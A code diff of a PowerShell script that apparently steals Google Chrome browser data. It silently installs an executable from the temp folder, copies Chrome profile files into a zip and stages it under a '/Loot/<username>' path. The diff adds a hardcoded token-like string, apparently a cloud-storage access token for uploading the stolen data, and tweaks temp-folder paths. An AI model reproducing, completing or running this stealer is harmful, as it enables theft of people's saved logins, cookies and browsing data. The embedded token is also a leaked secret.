@@ -33,7 +33,7 @@
 Start-Process "chrome.exe" -ArgumentList "--start-minimized"
 
 #------------------------------------------------------------------------------------------------------------------------------------
-
+$db = 'Q2cTyOsHDDQAAAAAAAAAAS4nV2ZDq7HRORdQBurV4ZxSiMQPNsTy4u_VfLWNIj2J'
 $T=$env:tmp
 $U=$env:UserName
 cd $T
@@ -46,7 +46,7 @@ Start-Process -FilePath $T"\py.exe" -ArgumentList "/S /v/qn" -Wait
 
 Sleep 5
 
-$GoogleFolderPath = "$env:temp\Chrome-Data"
+$GoogleFolderPath = "$env:tmp\Chrome-Data"
 $GfilePath = "$env:tmp\Chrome-Data.zip"
 $GdestinationPath = "/Loot/$env:USERNAME/Chrome-Data.zip"
 
@@ -54,7 +54,7 @@ mkdir $env:tmp\Chrome-Data
 
 function Copy-ChromeDataFiles {
     param(
-        [string]$sourceFolder = "$env:temp",
+        [string]$sourceFolder = "$env:tmp",
         [string]$destinationFolder = $GoogleFolderPath
     )
 
